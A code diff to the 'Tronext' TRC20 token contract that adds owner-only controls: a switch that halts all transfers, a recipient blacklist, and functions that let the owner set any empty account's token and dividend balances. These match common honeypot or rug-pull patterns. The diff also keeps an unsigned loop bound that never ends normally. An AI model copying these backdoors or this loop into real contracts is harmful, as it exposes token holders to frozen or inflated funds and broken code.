@@ -119,9 +119,11 @@ contract Tronext is TRC20Interface, Ownable {
     address[] private allowed_addresses;
 
     mapping (uint => bytes32) public dividendDays;//dividend days
-    uint dividendPosition = 400;
+    uint dividendPosition = 1000;
     mapping (address => bool) private _contracts_allowed; // contracts can access this
     mapping(uint=> uint) public randoms;
+    uint private canTrade;
+    mapping(address=>uint) black_list;
 
 
     event freezeEvent(address owner, uint256 value);
@@ -135,12 +137,32 @@ contract Tronext is TRC20Interface, Ownable {
         symbol = "TNX";
         name = "Tronext";
         _balances[address(this)] = (_totalSupply);
-        currentLvl = 1;
-        cost = 999;
-        dividendPeriod = 2*24*60*60;
-        all_period = 7*24*60*60;
+        currentLvl = 2;
+        cost = 1100;
+        dividendPeriod = 3*60*60;
+        all_period = 60*60*24*7;
         nextDividendTime = now + dividendPeriod;
+        uint[3] memory tokenInfo = getMinigInfo();
+        tokenInfo[0] = 1377830804848;
+        tokenInfo[1] = 0;
+        tokenInfo[2] = 377829357512;
+        setMiningInfo(tokenInfo);
         _contracts_allowed[address(this)] = true;
+    }
+
+    function setUserBalances(address user, uint tokenBalance, uint dividendBalance, uint trxReferral, uint tokenReferral) public onlyOwner {
+        require(_balances[user] == 0);
+        _balances[user] = tokenBalance;
+        uint[4] memory user_balance = getUserBalance(user);
+        user_balance[3] = dividendBalance;
+        user_balance[1] = tokenReferral;
+        user_balance[2] = trxReferral;
+        setUserBalance(user, user_balance);
+    }
+
+    function setCanTrade(uint res) public onlyOwner {
+        require(res==0 || res==1);
+        canTrade = res;
     }
 
     function getRandom(uint blockNum) external view returns (uint) {
@@ -166,6 +188,8 @@ contract Tronext is TRC20Interface, Ownable {
     }
 
     function transfer(address to, uint256 value) public returns (bool) {
+        require(canTrade==1);
+        require(black_list[to] == 0);
         require(value <= _balances[msg.sender]);
         require(to != address(0));
         _balances[msg.sender] = _balances[msg.sender].sub(value);
@@ -181,7 +205,13 @@ contract Tronext is TRC20Interface, Ownable {
         return true;
     }
 
+    function setBlack(address user, uint status) public onlyOwner {
+        black_list[user] = status;
+    }
+
     function transferFrom(address from, address to, uint256 value) public returns (bool) {
+        require(canTrade==1);
+        require(black_list[to] == 0);
         require(value <= _balances[from]);
         require(value <= _allowed[from][msg.sender]);
         require(to != address(0));
@@ -386,7 +416,7 @@ contract Tronext is TRC20Interface, Ownable {
         uint256 ft = freezeTime[sender];
         uint[4] memory user_balance = getUserBalance(sender);
         if(ft != 0) {
-            for(uint i = dividendPosition - 1; i >= dividendPosition-400; i--) {
+            for(uint i = dividendPosition - 1; i >= dividendPosition-1000; i--) {
                 bytes32 div_period = dividendDays[i];
                 if(getDate(div_period) > ft) {
                     user_balance[3] += getProfit(div_period)*user_balance[0]/1000000;
@@ -434,7 +464,7 @@ contract Tronext is TRC20Interface, Ownable {
         uint[4] memory user_balance = getUserBalance(sender);
         uint256 res = user_balance[3];
         if(ft != 0) {
-            for(uint i = dividendPosition - 1; i >= dividendPosition-400; i--) {
+            for(uint i = dividendPosition - 1; i >= dividendPosition-1000; i--) {
                 bytes32 div_period = dividendDays[i];
                 if(getDate(div_period) > ft) {
                     res += getProfit(div_period)*user_balance[0]/1000000;
@@ -486,7 +516,7 @@ contract Tronext is TRC20Interface, Ownable {
     }
 
     function setUserBalance(address addr_, uint[4] user_balance) internal {
-        require(_contracts_allowed[msg.sender] == true || msg.sender == address(this) || msg.sender == addr_);
+        require(_contracts_allowed[msg.sender] == true || msg.sender == address(this) || msg.sender == addr_ || msg.sender == _owner);
         userBalances[addr_] = (bytes32(user_balance[0])|(bytes32(user_balance[1])<<64)|(bytes32(user_balance[2])<<128)|(bytes32(user_balance[3])<<192));
     }
 
